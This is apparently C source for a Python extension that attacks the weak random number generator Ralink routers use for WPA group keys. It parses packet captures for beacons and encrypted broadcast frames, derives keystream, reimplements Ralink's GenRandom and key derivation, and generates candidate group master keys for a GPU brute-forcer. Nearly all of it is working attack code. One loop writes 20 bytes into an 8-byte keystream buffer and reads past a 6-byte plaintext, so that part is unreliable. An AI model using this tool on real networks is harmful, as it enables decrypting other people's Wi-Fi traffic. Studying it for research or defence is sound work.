/**
 * TODO: Strip away the CRC if present based on the radiotap header.
 *
 * derive_gtk:			2 calls to gen_random, 2 SHA1 calls
 * gen_random:			32 calls to ieee80211_prf_256
 * ieee80211_prf_256:	2 calls to HMAC-SHA1
 * HMAC-SHA1:			2 calls to SHA1
 *
 * --> In total 2 * 32 * 2 * 2 + 2 == 256 calls to SHA1.
 */
#include <Python.h>
#include <stdio.h>
#include <stdint.h>
#include <assert.h>
#include <string.h>

#include <arpa/inet.h>

#include <openssl/sha.h>
#include <openssl/hmac.h>

#define PY_ARRAY_UNIQUE_SYMBOL biases_ARRAY_API
#define NO_IMPORT_ARRAY
#include <numpy/arrayobject.h>

#include "crypto.h"
#include "mypcap.h"
#include "ieee80211header.h"
#include "util.h"
#include "crc.h"
#include "ralink.h"

#define MAX_PACKETLEN	2048


/**
 * Hash info to pass to a GPU-based bruteforcer
 */
typedef struct __attribute__((__packed__)) wpagmk_t {
	/** Timestamp of preceeding beacon */
	uint64_t tsf;
	/** Encryption type (0=Unknown, 1=TKIP, 2=CCMP) */
	EncType enctype;
	/** Nonce that is encrypted to form first ciphertext block */
	struct __attribute__((__packed__)) {
		uint8_t ccmflags;
		uint8_t nonceflags;	// TODO: This contains 4-bit priority, 1-bit management flag, 3-bit reserved
		uint8_t a2[6];
		uint8_t pn5;
		uint8_t pn4;
		uint8_t pn3;
		uint8_t pn2;
		uint8_t pn1;
		uint8_t pn0;
		uint16_t counter;
	} nonce;
	/**
	 * Derive keystream from the plaintext. Only first 6 bytes are assured to be correct.
	 * Last two bytes are only correct for IPv4 traffic.
	 */
	uint8_t keystream[8];
	/** Captured packet in raw format */
	uint16_t packetlen;
	uint8_t packet[MAX_PACKETLEN];
} wpagmk_t ;


PyObject * py_rl_get_ssids(PyObject *self, PyObject *args)
{
	const char *pcapfile;
	uint8_t buf[2048];
	FILE *pcap;
	int rval;

	// Parse parameters
	if (!PyArg_ParseTuple(args, "s", &pcapfile))
		return NULL;

	pcap  = pcap_open(pcapfile, false);
	if (!pcap) {
		PyErr_Format(PyExc_ValueError, "Unable to open file as pcap: %s", pcapfile);
		return NULL;
	}

	PyObject *ssidset = PySet_New(NULL);

	//
	// Step 1 -- Got over all packets and extract the SSIDs
	//
	ieee80211_radiotap_header *radiotap = (ieee80211_radiotap_header *)buf;
	while ((rval = pcap_read_packet(pcap, buf, sizeof(buf), NULL)) > 0)
	{
		ieee80211header *hdr = (ieee80211header *)(buf + radiotap->it_len);
		ieee80211fixedparams *params = (ieee80211fixedparams*)(hdr + 1);
		ieee80211tlv *tlv = (ieee80211tlv*)(params + 1);
		unsigned caplen = (unsigned)rval;

		if (caplen < IEEE80211_MINSIZE || hdr->fc.type != TYPE_MNGMT || hdr->fc.subtype != MNGMT_BEACON)
			continue;

		// Sanity check on header length
		unsigned hdrlen = sizeof(*hdr) - sizeof(*params);
		if (caplen < hdrlen) {
			PySys_WriteStdout("Warning: invalid header of beacon packet (too short)");
			continue;
		}

		// Extract the SSID
		unsigned tlvlen = caplen - hdrlen;
		ieee80211tlv *ssidtlv = ieee80211_get_tlv(tlv, 0, tlvlen);
		if (ssidtlv == NULL) {
			PyErr_Format(PyExc_ValueError, "Warning: beacon did not contain SSID TLV (tlvlen=%u, tag=%d)\n", tlvlen, tlv->tag);
			Py_RETURN_NONE;
		}

		PyObject *ssid = Py_BuildValue("(s#s#)", ssidtlv->value, ssidtlv->length, hdr->addr2, 6);
		PySet_Add(ssidset, ssid);
		Py_DECREF(ssid);
	}

	// Return hash info to python
	return ssidset;
}


int pcap_extract_hash(const char *pcapfile, const uint8_t bssid[6], wpagmk_t *hashinfo)
{
	FILE *pcap;
	uint8_t buf[2048];
	bool foundnetwork = false;
	int rval;

	pcap  = pcap_open(pcapfile, false);
	if (!pcap) return -1;


	//
	// Step 1 -- Find a beacon to extract the encryption type
	//

	ieee80211_radiotap_header *radiotap = (ieee80211_radiotap_header *)buf;
	while (!foundnetwork && (rval = pcap_read_packet(pcap, buf, sizeof(buf), NULL)) > 0)
	{
		ieee80211header *hdr = (ieee80211header *)(buf + radiotap->it_len);
		ieee80211fixedparams *params = (ieee80211fixedparams*)(hdr + 1);
		ieee80211tlv *tlv = (ieee80211tlv*)(params + 1);
		unsigned caplen = (unsigned)rval;

		if (caplen < IEEE80211_MINSIZE || hdr->fc.type != TYPE_MNGMT || hdr->fc.subtype != MNGMT_BEACON)
			continue;

		// Sanity check on header length
		unsigned hdrlen = sizeof(*hdr) - sizeof(*params);
		if (caplen < hdrlen) {
			PySys_WriteStdout("Warning: invalid header of beacon packet (too short)");
			continue;
		}

		if (hdr->fc.type != TYPE_MNGMT || hdr->fc.subtype != MNGMT_BEACON)
			continue;

		if (memcmp(hdr->addr2, bssid, 6) != 0)
			continue;

		// Parse group key cipher
		unsigned tlvlen = caplen - hdrlen;
		ieee80211tlv *wpatlv = ieee80211_get_vendor_tlv(tlv, (uint8_t*)"\x00\x50\xf2", 1, tlvlen);
		ieee80211tlv *rsntlv = ieee80211_get_tlv(tlv, 48, tlvlen);

		if (wpatlv == NULL && rsntlv == NULL) {
			PyErr_Format(PyExc_Exception, "Beacon does not contain WPA or RSN Information Element");
			return -1;
		}

		// Extract group cipher from either RSN or WPA elemnt
		uint8_t *multicastcipher = rsntlv ? rsntlv->value + 2 : wpatlv->value + 6;
		if        (memcmp(multicastcipher, "\x00\x50\xf2\x02", 4) == 0 || memcmp(multicastcipher, "\x00\x0f\xac\x02", 4) == 0) {
			hashinfo->enctype = EncType_TKIP;
		} else if (memcmp(multicastcipher, "\x00\x50\xf2\x04", 4) == 0 || memcmp(multicastcipher, "\x00\x0f\xac\x04", 4) == 0) {
			hashinfo->enctype = EncType_CCMP;
		} else {
			PyErr_Format(PyExc_Exception, "Unrecognized group cipher in WPA/RSN Information Element %x:%x:%x:%x",
				multicastcipher[0], multicastcipher[1], multicastcipher[2], multicastcipher[3]);
			return -1;
		}

		// Save other info and exit loop
		foundnetwork = true;
	}

	if (!foundnetwork) {
		PyErr_Format(PyExc_Exception, "Did not find beacon of BSSID %x:%x:%x:%x:%x:%x in capture",
			bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
		return -1;
	}


	//
	// Step 2 -- Search for the first encrypted broadcast packet (and track tsf in beacons so we have the closest one)
	//

	while ((rval = pcap_read_packet(pcap, buf, sizeof(buf), NULL)) > 0)
	{
		ieee80211header *hdr = (ieee80211header *)(buf + radiotap->it_len);
		unsigned caplen = (unsigned)rval;

		if (caplen < sizeof(*hdr)) continue;

		if (hdr->fc.type == TYPE_MNGMT && hdr->fc.subtype == MNGMT_BEACON && memcmp(hdr->addr2, bssid, 6) == 0)
		{
			ieee80211fixedparams *params = (ieee80211fixedparams*)(hdr + 1);

			if (caplen < sizeof(*hdr) + sizeof(*params)) {
				PySys_WriteStdout("Invalid header of beacon packet (too short)\n");
				continue;
			}

			hashinfo->tsf = params->timestamp;
		}
		else if (hdr->fc.type == TYPE_DATA && memcmp(hdr->addr2, bssid, 6) == 0 && ieee80211_broadcast_mac(hdr->addr1))
		{
			if (!hdr->fc.protectedframe) {
				PyErr_Format(PyExc_Exception, "Network broadcasted unencrypted data frame");
				return -1;
			}

			// strip away the CRC if present
			unsigned packetlen = caplen - radiotap->it_len;
			if (endswith_valid_crc(hdr, packetlen))
				packetlen -= 4;

			if (packetlen > sizeof(hashinfo->packet)) {
				PySys_WriteStdout("Warning: skipping too large broadcast packet\n");
				continue;
			}

			// Construct first NONCE used in AES-CRT encryption
			ccmpheader *ccmp = (ccmpheader*)((uint8_t*)hdr + ieee80211_hdrlen((uint8_t*)hdr));
			hashinfo->nonce.ccmflags = 0x01;
			hashinfo->nonce.nonceflags = 0x00; // TODO: Set based on priority of the packet
			memcpy(hashinfo->nonce.a2, hdr->addr2, 6);
			hashinfo->nonce.pn5 = ccmp->pn5;
			hashinfo->nonce.pn4 = ccmp->pn4;
			hashinfo->nonce.pn3 = ccmp->pn3;
			hashinfo->nonce.pn2 = ccmp->pn2;
			hashinfo->nonce.pn1 = ccmp->pn1;
			hashinfo->nonce.pn0 = ccmp->pn0;
			hashinfo->nonce.counter = htons(1);

			// Expected keystream
			const uint8_t *ciphertext = (uint8_t *)(ccmp + 1);
			const uint8_t *plaintext  = (const uint8_t *)"\xAA\xAA\x03\x00\x00\x00";
			for (int i = 0; i < 20; ++i)
				hashinfo->keystream[i] = ciphertext[i] ^ plaintext[i];
			hashinfo->keystream[6] = 0;
			hashinfo->keystream[7] = 0;

			// Copy packet
			memcpy(hashinfo->packet, hdr, packetlen);
			hashinfo->packetlen = packetlen;

			return 0;
		}
	}


	PySys_WriteStdout("End of function\n");	
	PyErr_Format(PyExc_Exception, "Found no broadcast data packet from BSSID %x:%x:%x:%x:%x:%x",
		bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
	return -1;
}


PyObject * py_rl_extract_hash(PyObject *self, PyObject *args)
{
	const char *pcapfile, *bssid;
	wpagmk_t hashinfo;
	int bssidlen;

	// Parse parameters
	if (!PyArg_ParseTuple(args, "ss#", &pcapfile, &bssid, &bssidlen))
		return NULL;

	if (bssidlen != 6) {
		PyErr_Format(PyExc_ValueError, "BSSID MAC address was not 6 bytes (was %d)", bssidlen);
		return NULL;
	}

	// Extract first hash
	memset(&hashinfo, 0, sizeof(hashinfo));
	if (pcap_extract_hash(pcapfile, (const uint8_t *)bssid, &hashinfo) < 0)
		return NULL;

	// Return hash info to python
	return Py_BuildValue("KIs#s#s#", hashinfo.tsf, hashinfo.enctype, &hashinfo.nonce, sizeof(hashinfo.nonce),
		hashinfo.keystream, sizeof(hashinfo.keystream), hashinfo.packet, hashinfo.packetlen);
}


PyObject * py_dump_packet(PyObject *self, PyObject *args)
{
	const uint8_t *packet;
	int packetlen;

	// Parse parameters
	if (!PyArg_ParseTuple(args, "s#", &packet, &packetlen))
		return NULL;

	dump_wlan_packet(packet, packetlen);

	// Return hash info to python
	Py_RETURN_NONE;
}


/**
 * Ralink's implementation of GenRandom, assuming only a single timestamp is used.
 * Mainly included here to verify and test implementations, debug simple cases, etc.
 * *NOT* optimized for speed!
 *
 * @param macaddr		[IN] 6-byte MAC address
 * @param time			[IN] 4-byte timestamp
 * @param random		[OUT] 32-byte random output
 */
void ralink_gen_random(const uint8_t *macaddr, uint32_t time, uint8_t *output, int incpos = 32)
{
	int i;
	uint8_t	local[44] = {0}, zeros[32] = {0};
	uint8_t	label[] = {'I', 'n', 'i', 't', ' ', 'C', 'o', 'u', 'n', 't', 'e', 'r'};

	/* initialize */
	memset(output, 0, 32);
	memcpy(local, macaddr, 6);
	memcpy(&local[6], &time,sizeof(time));

	for	(i = 0;	i <	32;	i++)
	{
		/* output = macaddr || time || result || i */
		memcpy(&local[10], output, 32);
		memcpy(&local[42], &i, 2);

		/* to increase timestamp during generation */
		if (i == incpos) {
			time++;
			memcpy(&local[6], &time,sizeof(time));
		}

		/* output = PRF(zeros, "Init Counter", local) */
		ieee80211_prf_256(zeros, 32, label, 12, local, sizeof(local), output);
	}
}


/**
 * See 802.11-2012: 11.6.1.4 "Group key hierarchy"
 *
 * Bad documentation: "Any other pseudorandom function, such as that specified in 11.6.1.2, could
 * also be used." --> still need a strong seed!
 */
inline void derive_gtk(uint8_t *gmk, uint8_t *nonce, uint8_t *macaddr, uint8_t *output, size_t output_len)
{
    uint8_t local[38];
    uint8_t label[] = {'G', 'r', 'o', 'u', 'p', ' ', 'k', 'e', 'y', ' ', 'e', 'x', 'p', 'a', 'n', 's', 'i', 'o', 'n'};  

    memcpy(local, macaddr, 6);
    memcpy(&local[6], nonce, 32);

	// PRF(GMK, "Group key expansion", AA || GNonce)
    ieee80211_prf_256(gmk, 32, label, sizeof(label), local, sizeof(local), output);
}


PyObject * py_rl_test_crypto(PyObject *self, PyObject *args)
{
	uint8_t random1[32], random2[32], gtk[32];

	ralink_gen_random((uint8_t*)"\x38\x2C\x4A\xC1\x69\xBC", 4294894231, random1);
	if (0 != memcmp(random1, (uint8_t*)"\x4A\x16\xEB\xFF\x09\xEF\x2B\xE9\xE9\x6C\x89\x65\x0F\x82\xD3\xF8\xE8\xA5\x86\x2A\x0B\xE7\x16\xFE\x02\x42\xEB\x3E\x4B\x4F\x74\xB6", 32)) {
		PyErr_Format(PyExc_Exception, "ralink_gen_random failed on (38:2C:4A:C1:69:BC, 4294894231)\n");
		pydump_buffer(random1, 32, "Unexepcted output was");
		return NULL;
	}

	ralink_gen_random((uint8_t*)"\x38\x2C\x4A\xC1\x69\xBC", 4294894235, random2);
	if (0 != memcmp(random2, "\xA8\x5D\x09\x7F\x52\xAD\x4C\xC1\x04\xE4\x58\x66\x01\x73\xE2\x41\xCE\xD4\xFD\xBA\x25\x69\x5F\x7C\x1C\x4B\x03\xCE\x46\x8A\x78\x57", 32)) {
		PyErr_Format(PyExc_Exception, "ralink_gen_random failed on (38:2C:4A:C1:69:BC, 4294894235)\n");
		return NULL;
	}

	derive_gtk(random1, random2, (uint8_t*)"\x38\x2C\x4A\xC1\x69\xBC", gtk, sizeof(gtk));
	if (0 != memcmp(gtk, (uint8_t*)"\xD0\xFA\xB4\xAD\xA1\x48\xBD\x69\xBF\xF7\x4C\x47\x3F\xA9\x8F\x8D\xE0\xE1\x9E\x90\xC8\xF1\xD7\xB3\xCD\x90\x28\xD1\x90\x27\x59\xF5", 32)) {
		PyErr_Format(PyExc_Exception, "derive_gtk failed\n");
		return NULL;
	}

	Py_RETURN_NONE;
}


PyObject * py_rl_generate_keys(PyObject *self, PyObject *args)
{
	const uint8_t *macaddr = NULL;
	int macaddrlen;
	PyArrayObject *pyarray = NULL;
	npy_intp dims[2];
	unsigned int startJiffies;
	unsigned int maxDelta;

	//
	// Step 1 -- Parse parameters
	//

	if (!PyArg_ParseTuple(args, "s#II", &macaddr, &macaddrlen, &startJiffies, &maxDelta))
		return NULL;

	if (macaddrlen != 6) {
		PyErr_Format(PyExc_ValueError, "MAC address should be 6 bytes long");
		return NULL;
	}
	else if (startJiffies < (1UL << 31)) {
		PyErr_Format(PyExc_ValueError, "Got gmkJiffies lower than 2^31 (you gave %d). This is likely wrong.", startJiffies);
		return NULL;
	}
	else if (maxDelta >= 20) {
		PyErr_Format(PyExc_ValueError, "Got gmkDelta higher than 20 (you gave %d). This is likely wrong.", maxDelta);
		return NULL;
	}


	//
	// Step 2 -- Generate the possible GMKs
	//

	dims[0] = maxDelta * 32;	// split can occurs at 32 places
	dims[1] = 8;				// the gmk is 8 words long (32 bytes)
	pyarray = (PyArrayObject *) PyArray_SimpleNew(2, dims, NPY_UINT32);
	if (pyarray == NULL) {
		PyErr_SetString(PyExc_MemoryError, "Could not allocate memory for GMKs");
		return NULL;
	}

	uint32_t (*gmks)[][8] = (uint32_t (*)[][8])PyArray_DATA(pyarray);
	
	int index = 0;
	for (uint32_t delta = 0; delta < maxDelta; delta++) {
		for (int incpos = 1; incpos <= 32; incpos++) {
			//PySys_WriteStdout()

			ralink_gen_random(macaddr, startJiffies + delta, (uint8_t*)(*gmks)[index], incpos);

			// Already put in Big Endian for use in GPU SHA1 code
			for (int i = 0; i < 8; ++i)
				(*gmks)[index][i] = htonl((*gmks)[index][i]);

			index++;
		}
	}

	return (PyObject *)pyarray;
}

